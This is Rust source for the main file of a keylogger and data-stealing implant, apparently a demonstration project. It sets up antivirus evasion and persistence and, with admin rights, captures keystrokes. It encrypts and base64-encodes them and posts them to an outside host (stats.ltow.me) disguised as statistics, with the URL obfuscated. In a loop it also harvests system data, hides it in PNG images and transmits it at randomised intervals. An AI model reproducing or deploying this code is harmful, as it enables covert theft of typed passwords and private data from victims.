#![feature(maybe_uninit_ref)]

#[macro_use]
extern crate lazy_static;
extern crate sqlx;

use std::{char, mem::swap, process::exit, time::{Duration, Instant}};

use collectors::keyboard::Keylogger;
use com::https::{get_client, transmit_data};
use crypto::aes::encrypt;
use evade::setup_evade_thread;
use rand::Rng;
use reqwest::{Method, multipart::Form};
use serde_json::json;
use tokio::time::delay_for;
use tokio_tungstenite::tungstenite::Message;
use utils::{am_i_running, get_unique_id, hide_window, is_admin, setup_init_task};
use serde::{Serialize, Deserialize};

mod collectors;
mod com;
mod crypto;
mod data;
mod evade;
mod utils;

#[derive(Serialize, Deserialize, Debug)]
struct Keystrokes {
    id: Option<String>,
    keystrokes: Vec<Keystroke>
}
#[derive(Serialize, Deserialize, Debug)]
struct Keystroke {
    character: Option<String>,
    vk_code: i32,
    scan_code: i32,
}

#[tokio::main]
async fn main() {
    //hide_window();
    println!("Here, we should be closing the window. But for the sake of the demonstration, we are not!");

    setup_evade_thread();
    setup_init_task();

    if am_i_running() {
        exit(0);
    }

    println!("DEBUG: my id {:?}", get_unique_id());

    if is_admin() {
        tokio::spawn(async move {
            let mut keylogger = Keylogger::subscribe().unwrap();
            let mut buffer = Vec::new();
            let mut last_msg = Instant::now();

            while let Some(input) = keylogger.rx.recv().await {
                if input.is_down() {
                    let keystroke = Keystroke {
                        character: Some(input.as_str().to_string()),
                        vk_code: input.vk_code as _,
                        scan_code: input.scan_code as _
                    };

                    buffer.push(keystroke);
                }

                let time = Instant::now().duration_since(last_msg);
                if buffer.len() > 31 || (buffer.len() > 0 && time.as_secs() > 600) {
                    let mut sendable_buffer = Vec::new();
                    swap(&mut buffer, &mut sendable_buffer);
                
                    tokio::spawn(async move {
                        let keystrokes = Keystrokes {
                            id: get_unique_id(),
                            keystrokes: sendable_buffer
                        };

                        if let Ok(json) = serde_json::to_string(&keystrokes) {
                            println!("DEBUG: sending keystrokes: {:?}", keystrokes);

                            let cipher = encrypt(json.as_bytes());
                            let payload = base64::encode(&cipher);
                            let client = get_client(obfstr::obfstr!("https://stats.ltow.me/statistics")).await;
                            
                            let param = [("stat_blob", payload.as_str())];
                            let _ = client.post("https://stats.ltow.me/statistics")
                                .form(&param)
                                .send()
                                .await;
                        }
                    });
                }
            }
        });
    }

    loop {
        println!("DEBUG: harvesting data");
        let data_payload = data::DataPayload::recolt_periodic().await;
        println!("DEBUG: data harvested, encoding into png, compressing & encrypting");
        if let Some(payload) = data_payload.encode_for_send_to_image() {
            println!("DEBUG: transmitting image...");
            transmit_data(payload).await;
            println!("DEBUG: image sent!");
        } else {
            println!("DEBUG: failed to encode image, this should have not happened!");
        }

        let waiting_time = Duration::from_secs(rand::thread_rng().gen_range(240..600));
        println!("DEBUG: next harvesting in {:?}", waiting_time);
        delay_for(waiting_time).await;
    }
}
